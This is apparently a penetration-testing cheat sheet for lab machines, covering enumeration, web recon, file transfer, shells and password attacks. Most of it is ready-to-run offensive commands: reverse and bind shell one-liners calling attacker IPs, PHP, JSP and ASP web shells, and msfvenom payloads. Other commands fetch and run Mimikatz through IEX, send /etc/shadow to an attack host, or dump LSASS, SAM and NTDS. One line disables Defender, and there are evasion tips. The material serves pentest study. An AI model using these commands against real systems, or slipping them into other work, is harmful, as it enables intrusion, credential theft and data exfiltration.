```bash
# SSH (22/tcp)
./ssh-audit.py <IP>
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password   # force password auth
ssh -i ./id_rsa <username>@<IP>                              # force key auth; chmod 600 ./id_rsa first

# Rsync (873/tcp)
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev-folder

# R-services (512, 513, 514/tcp)
rcp
rexec
rlogin
rsh
rstat
rwho
rusers -al

# RDP (3389/tcp)
nmap -sV -sC <IP> -p3389 --script rdp*
./rdp-sec-check.pl <IP>
xfreerdp /u:<username> /p:"<password>" /v:<IP> /cert:ignore /dynamic-resolution /drive:share,<LOCAL_PATH>

# WinRM (5985 HTTP, 5986 HTTPS)
# Windows: Test-WsMan
evil-winrm -i 10.129.201.248 -u <username> -p <password>

# WMI (135/tcp)
python3-impacket/examples/wmiexec.py username:"<PASSWORD>"@<IP> "hostname"
```

## 4. Web Reconnaissance

### WHOIS

```
whois inlanefreight.com
```

### WhatWeb

```
whatweb -a 3 http://dev.inlanefreight.local -v
```

### Virtual Hosts

```
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Certificate Transparency (crt.sh)

```
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

### Banner Grabbing

```
you can use Wappalyzer,BuiltWith,WhatWeb,Nmap,Netcraft
curl -I inlanefreight.com
```

### WAF Detection

```
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com
```

### Nikto

```
nikto -h inlanefreight.com -Tuning b
```

### ReconSpider

```
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

### Automated Reconnaissance

```
you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
```

### Crawling, robots.txt, .well-known & Archives

```bash
# robots.txt and sitemap
curl -s http://<TARGET>/robots.txt
curl -s http://<TARGET>/sitemap.xml

# Common .well-known URIs
for p in security.txt change-password openid-configuration \
         assetlinks.json apple-app-site-association; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "http://<TARGET>/.well-known/$p"
done
```

Crawling and JavaScript discovery:

```bash
gospider -s http://<TARGET> -d 2 -c 10
hakrawler -url http://<TARGET> -depth 2
katana -u http://<TARGET> -d 3 -jc
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Inspect JavaScript bundles for API routes, secrets, and hidden endpoints:

```bash
curl -s http://<TARGET>/ | grep -oE 'src="[^"]+\.js' | cut -d'"' -f2
python3 LinkFinder.py -i http://<TARGET> -d
```

Search engine discovery:

```text
site:<DOMAIN>
site:<DOMAIN> filetype:pdf
site:<DOMAIN> inurl:admin
site:<DOMAIN> intitle:"index of"
inurl:<DOMAIN> ext:php
```

```bash
theHarvester -d <DOMAIN> -b all -l 500
```

Web archives:

```bash
waybackurls <DOMAIN> | tee wayback.txt
gau <DOMAIN> | tee gau.txt
cat wayback.txt gau.txt | sort -u | grep -E '\.(js|php|asp|aspx|jsp|json|xml|bak|old|zip)$'
```

Also query the Wayback Machine manually and use `waybackpack` for older versions of a specific URL.

## 5. File Transfers

### Windows

#### Download Operations

##### PowerShell Base64

```
A> md5sum id_rsa.txt
A> cat id_rsa |base64 -w 0;echo
V> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa.txt", [Convert]::FromBase64String("<BASE64_ENCODED_PRIVATE_KEY>"))
V> Get-FileHash C:\Users\Public\id_rsa.txt -Algorithm md5
```

##### PowerShell Web Downloads

PowerShell download methods: `OpenRead`, `OpenReadAsync`, `DownloadData`, `DownloadDataAsync`, `DownloadFile`, `DownloadFileAsync`, `DownloadString`, `DownloadStringAsync`.

```powershell
# DownloadFile — save to disk
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# DownloadFileAsync — non-blocking
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerViewAsync.ps1')

# DownloadString — fileless execution
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

# Invoke-WebRequest
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Common PowerShell download errors and fixes:

```powershell
# If the SSL/TLS certificate cannot be validated
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# If the response cannot be parsed
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Upload helper
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Reference: <https://gist.github.com/HarmJ0y/bb48307ffa663256e239>

##### SMB Downloads

```
A> sudo impacket-smbserver share -smb2support /tmp/smbshare
V> copy \\192.168.220.133\share\nc.exe
A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
V> net use n: \\192.168.220.133\share /user:<USER> <PASSWORD>

```

##### FTP Downloads

```
A> sudo pip3 install pyftpdlib
A> sudo python3 -m pyftpdlib --port 21
V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
# OR
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo GET file.txt >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> Log in with USER and PASS first.
V> ftp> USER anonymous

V> ftp> GET file.txt
V> ftp> bye

V> C:\htb>more file.txt
V> This is a test file
```

#### Upload Operations

##### PowerShell Base64

```
V> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
V> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
A> echo '<BASE64_BLOB>' | base64 -d > hosts
```

##### PowerShell Web Uploads

```
ref:- https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
A> pip3 install uploadserver
A> python3 -m uploadserver
V> PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-------------------------------------------------------------------------------------------------------------------
A> nc -lvnp 8000
V> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
V> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
A> echo <base64> | base64 -d > hosts
```

##### SMB Uploads

```
A> sudo pip3 install wsgidav cheroot
A> sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
V> dir \\192.168.49.128\DavWWWRoot
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

##### FTP Uploads

```
A> sudo python3 -m pyftpdlib --port 21 --write
V> PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
# OR
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> ftp> USER anonymous
V> ftp> PUT c:\windows\system32\drivers\etc\hosts
V> ftp> bye
```

### Linux

#### Download Operations

##### Base64

```
A> md5sum id_rsa
A> cat id_rsa |base64 -w 0;echo
V>  echo '<BASE64_ENCODED_PRIVATE_KEY>' | base64 -d > id_rsa
V> md5sum id_rsa
```

##### Wget & cURL

```
V> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
V> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
V> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
V> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

##### Bash /dev/tcp

```
V> exec 3<>/dev/tcp/10.10.10.32/80
V> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
V> cat <&3
```

##### SSH Downloads

```
A> sudo systemctl enable ssh
A> sudo systemctl start ssh
A> netstat -lnpt
V> scp plaintext@192.168.49.128:/root/myroot.txt .
```

#### Upload Operations

##### HTTP Upload Server

```
A> sudo python3 -m pip install --user uploadserver
A> openssl req -x509 -out /differentdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
A>  mkdir https && cd https
A> sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
V> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

##### Alternative HTTP Servers

```
V> python3 -m http.server
# OR
V> python2.7 -m SimpleHTTPServer
# OR
V> php -S 0.0.0.0:8000
# OR
V> ruby -run -ehttpd . -p8000
A> wget 192.168.49.128:8000/filetotransfer.txt
```

##### SCP Upload

```
V> scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### Transferring Files with Code

#### Python

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP

```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
# OR
php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
# OR
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Ruby

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

#### JavaScript

Create `wget.js` with the following contents:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run it:

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

#### VBScript

Create `wget.vbs` with the following contents:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Run it:

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

#### Python 3 Upload

```
A> python3 -m uploadserver
A> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Miscellaneous

#### Netcat & Ncat

##### Forward File Transfer

```
V> nc -l -p 8000 > SharpKatz.exe
# OR
V> ncat -l -p 8000 --recv-only > SharpKatz.exe
A> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
# OR
A> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

##### Reverse File Transfer

```
A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
V> nc 192.168.49.128 443 > SharpKatz.exe
# OR
A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

--------------------------------------------------------

A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
# OR
A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

#### PowerShell Sessions

```
client> Test-NetConnection -ComputerName DATABASE01 -Port 5985
# OR
client> $Session = New-PSSession -ComputerName DATABASE01
client> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

#### RDP Drive Redirection

Mount a local directory inside an RDP session with the drive-redirection flag, then access it through `\\tsclient\`.

```bash
# rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p '<PASSWORD>' -r disk:linux='/home/user/rdesktop/files'

# FreeRDP
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'<PASSWORD>' /drive:linux,/home/plaintext/htb/academy/filetransfer
xfreerdp /v:172.16.5.35 /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
```

Inside the remote session, open `\\tsclient\` and interact with the shared folder.

![RDP drive redirection](https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb)

### Protected File Transfers

#### Windows Encryption

Download `Invoke-AESEncryption.ps1` from the [PowerShell Gallery](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1), then import and use it:

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key '<KEY>' -Path .\scan-results.txt
```

#### Linux Encryption

```
# Encrypting
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

```

### Receiving Files over HTTP/S

This technique enables the Nginx `PUT` method so files can be uploaded with `curl -T`.

#### Nginx — Enabling PUT

1. Create an upload directory and give Nginx ownership:

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

2. Add an Nginx site that enables `dav_methods PUT`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

3. Enable the site, restart Nginx, and confirm it is listening:

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
sudo rm /etc/nginx/sites-enabled/default   # if the default site conflicts
ss -lnpt | grep 9001
tail -2 /var/log/nginx/error.log
```

4. Test the upload:

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

### Living off the Land

Use built-in binaries to download or upload files without dropping tools. See LOLBAS for Windows and GTFOBins for Linux.

#### LOLBAS — Certreq Upload

```cmd
:: On the attack host
sudo nc -lvnp 8000

:: On the Windows target — upload win.ini
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

#### GTFOBins — OpenSSL Download

```bash
# On the attack host: serve the file over TLS
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# On the target: receive the file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

#### Bitsadmin Download

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
bitsadmin /transfer myJob /download /priority high http://10.10.16.33:8000/bb.txt C:\Users\htb-student\Desktop\bb.txt
```

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil Download

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

#### GfxDownloadWrapper Download

```cmd
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

#### WinHttpRequest (COM)

```powershell
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.ResponseText
```

#### Msxml2 (COM)

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.responseText
```

#### BITS (COM)

```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
$r = gc $env:temp\t
rm $env:temp\t
iex $r
```

### Detection & Evasion

Download methods leave distinct artifacts. Common detection signals:

- PowerShell `Invoke-WebRequest`/`Invoke-RestMethod` user-agent.
- `certutil` user-agent (`Microsoft-CryptoAPI`).
- BITS transfers (`Microsoft BITS` user-agent and `Start-BitsTransfer` events).
- WinHttpRequest/Msxml2 COM requests from Office or script hosts.
- Large outbound transfers, uncommon destinations, and executable downloads.
- Sysmon Event IDs 1 (process), 3 (network), 11 (file create), 22 (DNS).

Evasion basics:

```powershell
# Change the PowerShell download user-agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER>/file -UserAgent $UserAgent -OutFile file
```

- Prefer HTTPS and legitimate cloud services (GitHub, OneDrive, S3) over raw HTTP.
- Use built-in/LOLBins (`certutil`, `bitsadmin`, `GfxDownloadWrapper`) where appropriate.
- Encode or chunk payloads; avoid obvious strings.
- Test detection in the lab before relying on a method in production.
- Egress filtering, proxy logging, and EDR rule tuning are the defensive counterparts.

## 6. Shells

### Reverse Shell

```
# bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
# powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
# for disable antivirus to run reverse shell --> Set-MpPreference -DisableRealtimeMonitoring $true
# from our device $ nc -lvnp 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
```

### Bind Shell

```
# V> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
# OR
# V> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
# A> nc -nv 10.129.41.200 7777
# python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
# powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
# from our device, we will try to access the target machine through $nc 10.10.10.1 1234
# Ref:- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
```

### Web Shell

```
# php --> <?php system($_REQUEST["cmd"]); ?>
# php --> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
# jsp --> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# asp --> <% eval request("cmd") %>
```

### TTY Upgrade

Spawn a fully interactive TTY from a limited shell.

```bash
# Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
python  -c 'import pty; pty.spawn("/bin/bash")'

# Direct shell
/bin/sh -i

# Interpreters
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'

# File-based execution
find / -name <filename> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```

Vim escape:

```vim
:set shell=/bin/sh
:shell
```

### Payloads, MSFvenom & Web Shells

Payload types:

- **Single** — self-contained (e.g., `windows/shell_reverse_tcp`).
- **Stager + stage** — small stager downloads the main payload (e.g., `windows/meterpreter/reverse_tcp`).
- **Bind vs reverse** — bind listens on the target; reverse connects back to the attack host.
- **Inline vs staged** — inline embeds the payload; staged fetches it.

MSFvenom examples:

```bash
msfvenom -l payloads

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > shell.elf

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe > update.exe

# PHP / ASPX / WAR
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=443 -f raw > shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f war > shell.war
```

Listener:

```text
msf6 > use multi/handler
msf6 > set payload windows/shell_reverse_tcp
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 443
msf6 > run
```

Web shells:

```bash
# Laudanum (ASPX example)
cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx

# Antak (Nishang)
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx
```

```php
<?php system($_REQUEST['cmd']); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

Detection and prevention:

- AV/EDR signatures, AMSI, and script-block logging.
- Web shells in upload directories, unusual child processes of web servers, and outbound connections from web services.
- Disable dangerous functions, restrict upload directories, and monitor file integrity.

## 7. Password Attacks

### Password Mutations

```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

### Remote Password Attacks

```
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

### Windows Credential Harvesting

```
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A PowerShell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Linux Credential Hunting

```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -Ev "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "doc|lib|headers|share|man";done

# Uses Linux-based find command to search for text files.
find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \)

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### Cracking Passwords

```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```

### Login Brute Forcing (Hydra)

```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

### Hashing, John & Hashcat

Identify hashes before cracking:

```bash
hashid -j <HASH>
hashid -m '$1$...'
```

John:

```bash
john --single passwd
john --wordlist=<WORDLIST> <HASH_FILE>
john --incremental <HASH_FILE>
john <HASH_FILE> --show
```

Hashcat:

```bash
hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -a 3 -m 0 <HASH> '?u?l?l?l?l?d?s'
hashcat --help
```

Protected files and archives:

```bash
locate '*2john*'

ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash

office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

bitlocker2john -i Backup.vhd > backup.hashes
```

Use `hashcat --example-hashes` or `hashid` to map the format to the correct mode.

### Credential Access & Lateral Movement

Windows credential sources:

```cmd
# SAM / SYSTEM / SECURITY
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SECURITY SECURITY.SAV

# LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Credential Manager
cmdkey /list
